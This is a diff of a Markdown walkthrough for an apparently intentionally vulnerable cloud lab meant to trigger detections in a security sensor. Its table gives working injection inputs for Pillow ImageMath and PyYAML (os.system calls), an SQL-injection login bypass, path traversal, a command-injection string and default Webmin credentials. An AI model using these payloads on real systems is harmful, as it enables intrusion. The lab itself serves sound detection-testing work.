@@ -1,33 +1,30 @@
-# Lab 2 — VM and Hosts walkthrough
+# Lab 2 walkthrough — VM and Hosts
 
-Same steps are shown in the app at **`/walkthrough`** (and summarized on `/labs`).
+Same content is live in the app at **`/walkthrough`** and on each **`/labs/<attack>`** page.
 
-## Before you attack
+## Session order
 
-1. Connect the cloud account in Upwind (CSPM / agentless / DSPM / activity logs).
-2. Deploy `infrastructure/<cloud>/lab1-3` and open `lab2_application_url`.
-3. Get a shell on the VM ([HOST-ACCESS.md](../docs/HOST-ACCESS.md)).
-4. Install the **Upwind host sensor** (eBPF). Wait for the host to appear and baseline **L3 / L4 / L7**.
+1. Shell onto the VM (AWS SSM / Azure SSH / GCP `gcloud compute ssh`) — see `docs/HOST-ACCESS.md`
+2. Install the Upwind **host eBPF sensor**
+3. Wait for L3 / L4 / L7 baseline
+4. Run FiU modules → **Function in use**
+5. Run SQLi / traversal / cmd / secrets / Webmin → **Threats / Stories**
+6. `terraform destroy` in `infrastructure/<cloud>/lab1-3`
 
-## Then generate signal
+## Attacks (short)
 
-| Order | What | Where | Look for in Upwind |
-|-------|------|--------|--------------------|
-| 1 | FiU CVEs (Pillow, Brotli, PyYAML, tarfile) | `/labs` → FiU modules | Function in use / vuln runtime |
-| 2 | SQLi login | `/login` or SQLi lab | App / threat stories if instrumented |
-| 3 | Path traversal / cmd injection | Matching lab cards | Runtime detections |
-| 4 | Webmin | `lab2_webmin_url` → `admin` / `password` | Exposed mgmt / host compromise path |
+| Lab | What to do | Payload / input |
+|-----|------------|-----------------|
+| Pillow ImageMath | POST form on lab page | `__import__('os').system('id > /tmp/jwz-cve-2023-50447-id.txt')` |
+| Pillow JPEG | Upload a JPEG | any `.jpg` |
+| Pillow EPS | POST default or crafted filename | `/tmp/jwz-fiu/benign.eps` or names starting `-` / `@` |
+| Brotli | POST base64 brotli (heartbeat also runs) | base64 bytes |
+| PyYAML | POST checkout form | `!!python/object/apply:os.system ['id > /tmp/jwz-cve-2020-14343-id.txt']` |
+| tarfile | Upload tar (optional `../` members) | `.tar` / `.tar.gz` |
+| SQLi login | `/login` bypass | email `' OR '1'='1` / password `anything` |
+| Path traversal | Form on lab page | `../secret.txt` |
+| Cmd injection | Ping form | `127.0.0.1; id` |
+| Secrets | Open lab page | shows `JWZ_DEMO_*` env |
+| Webmin | `lab2_webmin_url` | `admin` / `password` |
 
-## Demo accounts
-
-```
-jordan.lee@example.com / jordanwaves
-sam.nguyen@example.com / samwaves
-admin@jayswakezone.example / staffadmin
-
-SQLi bypass: email  ' OR '1'='1   password  anything
-```
-
-## Done
-
-When finished: `terraform destroy` in `lab1-3`. Do not leave the public VM up.
+Open **`http://<lab2_ip>:8080/walkthrough`** for the full step list next to the live forms.
